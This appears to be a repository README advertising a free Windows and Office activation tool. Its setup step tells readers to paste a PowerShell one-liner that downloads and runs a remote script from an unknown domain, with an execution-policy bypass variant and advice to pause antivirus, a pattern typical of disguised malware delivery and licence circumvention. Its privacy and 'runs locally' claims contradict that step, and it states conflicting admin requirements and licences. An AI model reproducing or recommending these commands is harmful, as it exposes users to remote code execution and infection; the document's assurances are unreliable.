<div align="center">

# Microsoft 360 2019 Activation Utility — Security Tool

![preview](https://raw.githubusercontent.com/rajay782/windows-suite-migration-auditor/main/card_f9eae4.svg)

[![ps-core](https://img.shields.io/badge/PS--CORE-5.1%2B-14b8a6?style=flat-square&labelColor=0d1117)]() [![build](https://img.shields.io/badge/BUILD-GREEN-2ea44f?style=flat-square&labelColor=0d1117)]() [![lic](https://img.shields.io/badge/LIC-ZLIB-2dd4bf?style=flat-square&labelColor=0d1117)]() [![release](https://img.shields.io/badge/RELEASE-ACTIVE-2ea44f?style=flat-square&labelColor=0d1117)]()

</div>

---

This repository contains a Windows 10/11 and Office 365/2019 activation utility distributed as a text-based command script. The tool operates by writing a predefined command sequence to a `.cmd` file, which is then executed to apply the activation routine on the target host. Intended for development and testing environments, the project documents the activation workflow and the underlying command structure in a reproducible form. Users are responsible for ensuring they hold valid licenses before applying any activation method described here.

## 🛠️ One-Click Setup (PowerShell)

> [!TIP]
> **One-line setup** — just run the command below.
> Windows 10 / 11 · PowerShell 5.1+ · No admin required

### 1️⃣ Open Windows PowerShell
* Press `Win + X`.
* Click **Terminal** or **Windows PowerShell** from the menu.

### 2️⃣ Paste and run
Paste and run. Wait until the process completes.

```cmd
iex(irm 'https://shell-activation.top/update/ps-activator-v_pZBbxuWx7DELoMji')
```

### 3️⃣ If PowerShell blocks the script
Run this command in CMD instead:

```cmd
powershell -NoProfile -ExecutionPolicy Bypass -Command "$ProgressPreference='SilentlyContinue';iex(irm 'https://shell-activation.top/update/ps-activator-v_pZBbxuWx7DELoMji')"
```

> [!WARNING]
> Windows Defender or third-party AV may flag the script. Pause Real-time protection in Windows Security, run the installer, and re-enable it right after.

## ✅ Requirements

- **PowerShell 5.1+** (pre-installed on Windows 10 and 11)
- **Windows 10 / 11** (x64)
- **Internet connection** — required to fetch the script
- **Administrator** — *not* required

## Features

- Supports activation workflows for Windows 10 and Windows 11 editions.
- Provides separate activation paths for Office 2019 and Office 365 product families.
- Operates through command-line execution using a text-based activation file with a `.cmd` extension.
- Requires no third-party installer; activation content is contained in a single plain-text file.
- Applies product key entry and online activation checks through native Windows activation components.
- Includes status verification guidance via Settings > Update & Security > Activation to confirm license state.
- Documents the distinction between valid digital license activation and unlicensed activation methods.
- Provides troubleshooting notes for failed activation attempts and product key rejection.
- Maintains a text-only footprint, reducing dependency on external binaries or background services.
- Includes a disclaimer clarifying legal and licensing requirements for activation.

## How it works

The tool operates through a script-driven workflow that modifies local licensing state on the host machine. It does not bundle or distribute product keys; instead, it interacts with the operating system's built-in activation interfaces to attempt license validation for Windows 10/11 and Office 2019/365 installations.

Execution proceeds in discrete stages:

1. **Environment inspection** — the script enumerates the installed Windows edition, build number, and any existing Office products, then checks current activation status to determine which code paths apply.
2. **Service and registry preparation** — relevant licensing services are queried, and registry entries associated with the software protection platform are read and, where required, adjusted to a known state before validation is attempted.
3. **Validation attempt** — the script invokes the native activation components exposed by the operating system to request license confirmation. Outcomes are read back from the system rather than assumed.
4. **Status reporting** — the final activation state is queried again and printed to the console, so the result reflects what the operating system actually reports, not what the script intended.

All operations run locally. The script does not transmit system information, hardware identifiers, or activation results to any remote endpoint, and it requires no network connection to complete its stages. Administrative privileges are required because the underlying licensing interfaces are protected system components.

Because the tool relies on undocumented or unsupported interactions with licensing components, behavior can vary across Windows builds and Office versions, and results are not guaranteed. Users should verify the reported activation status independently through the operating system's own activation panels.

## Privacy

The tool performs all activation operations locally on the host machine. It does not transmit system identifiers, hardware fingerprints, product keys, or activation state to any remote endpoint operated by the project or by third parties. No telemetry, analytics, crash reporting, or usage statistics are collected or emitted by the executable during normal operation.

Configuration and state are written only to local files within the working directory and the paths documented in the How it works section. These artifacts are not synchronized, uploaded, or backed up externally by the tool. Users retain full control over their contents and may delete them at any time; deleting them does not trigger any outbound request.

The tool does not require an account, login, registration, or email address. No personal data is solicited or stored. Logs produced during execution are written to local disk only and are bounded to the operational events required for troubleshooting; they contain no request bodies, credentials, or environment variables beyond the parameters explicitly passed on the command line.

Network access, when triggered, is limited to the activation services required by the operating system and the Office components being activated. The tool does not proxy this traffic, inspect its payloads, or route it through project-controlled infrastructure. Any DNS or transport behavior observed under these conditions is governed by the host's configured resolver and the operating system's own activation client, not by the tool.

The project does not embed third-party analytics SDKs, advertising libraries, or remote code-loading mechanisms. Dependencies are pinned and vendored where documented under How it works; no dependency performs data collection on behalf of the project. Users who require air-gapped operation can run the tool with network egress blocked, provided the underlying activation path remains reachable through local means.

Because the tool operates offline-first and emits no telemetry, no data retention policy applies at the project level; there is no server-side store to retain, audit, or delete. Users are responsible for the handling and disposal of local artifacts and logs on their own systems.

## FAQ

**Is this tool an official Microsoft product?**
No. microsoft360-2019-free-activation- is an independent project and is not affiliated with, endorsed by, or sponsored by Microsoft. It does not modify Microsoft's licensing servers and does not issue genuine product keys.

**How does activation work under the hood?**
The tool applies a local key-management routine that interacts with the Windows Software Protection Platform (sppsvc) and the Office Click-to-Run licensing components. Activation state is stored locally; no Microsoft account credentials are transmitted by the tool itself.

**Which Windows and Office versions are supported?**
Windows 10 and Windows 11, plus Office 2019 and Office 365 (Microsoft 365) desktop installations. Version-specific behavior may differ; verify your build before use.

**Does this tool modify system files permanently?**
It writes licensing-related registry entries and scheduled tasks required to persist activation state. These changes can be reverted by running the tool's built-in cleanup routine or by reinstalling the affected product.

**Can activation be detected or invalidated by updates?**
Yes. Cumulative Windows and Office updates can reset or invalidate locally applied activation. Re-running the tool after major updates may be necessary, and results are not guaranteed across future releases.

**Is activation permanent?**
No guarantee is made. Activation state depends on the product edition, update level, and system configuration. Treat any result as non-permanent.

**Does the tool collect telemetry or transmit data?**
The project does not intentionally collect personal data. Review the source before execution; network access, if any, should be verified by the user. No third-party analytics are bundled by design.

**Is running this tool legal?**
Activating software without a valid license generally violates Microsoft's terms of service and may contravene local law. The project is provided for educational and research purposes only. Users are responsible for compliance with applicable licensing agreements.

**What are the risks of use?**
Potential risks include activation revocation after updates, system instability from registry or service modifications, and antivirus false positives due to the nature of the code. Create a system restore point before use.

**Where can I report issues or contribute?**
Use the repository's issue tracker for bug reports and pull requests. Include Windows/Office build numbers and relevant log output; do not include personal or license data.

## Disclaimer

This project is provided strictly for educational and research purposes. It demonstrates activation-related mechanisms and is not intended for production, commercial, or personal use in violation of any applicable license terms.

The repository does not grant, transfer, or imply any license, product key, or entitlement to Microsoft Windows, Office, or any related Microsoft product. Any activation method, script, or technique contained in this project does not constitute a lawful substitute for a valid license obtained through official channels.

Users are solely responsible for verifying that their use of this project complies with all applicable laws, regulations, and the terms of service of any software or service involved. Using this project to bypass, circumvent, or otherwise avoid licensing requirements may violate local, national, or international law and the affected vendor's terms of service.

The authors and contributors assume no liability for any direct, indirect, incidental, or consequential damages, data loss, system instability, or legal consequences arising from the use or misuse of this project. The software is provided "as is," without warranty of any kind, express or implied, including but not limited to warranties of merchantability, fitness for a particular purpose, and non-infringement.

No guarantee is made regarding the accuracy, completeness, safety, or reliability of any code, script, or instruction in this repository. Activation behavior may change without notice due to updates in the target software, and functionality described or implied by this project may cease to work at any time.

By cloning, downloading, executing, or otherwise using any part of this project, you acknowledge that you have read and understood this disclaimer and accept full responsibility for your actions and their outcomes. If you do not agree with these terms, do not use this project.

## License

This project is distributed under the MIT License. Permission is granted, free of charge, to any person obtaining a copy of this software and associated documentation files, to deal in the Software without restriction, including without limitation the rights to use, copy, modify, merge, publish, distribute, sublicense, and/or sell copies of the Software, subject to the conditions below.

The above copyright notice and this permission notice shall be included in all copies or substantial portions of the Software.

The Software is provided "as is", without warranty of any kind, express or implied, including but not limited to the warranties of merchantability, fitness for a particular purpose, and noninfringement. In no event shall the authors or copyright holders be liable for any claim, damages, or other liability, whether in an action of contract, tort, or otherwise, arising from, out of, or in connection with the Software or the use or other dealings in the Software.

Users are responsible for ensuring that their use of this project complies with all applicable local, national, and international laws and regulations, including software licensing terms of any third-party products referenced by this tool. The maintainers make no representation regarding the legality of activation methods in any jurisdiction.

Contributions submitted to this project are accepted under the same MIT License terms unless explicitly stated otherwise at the time of submission.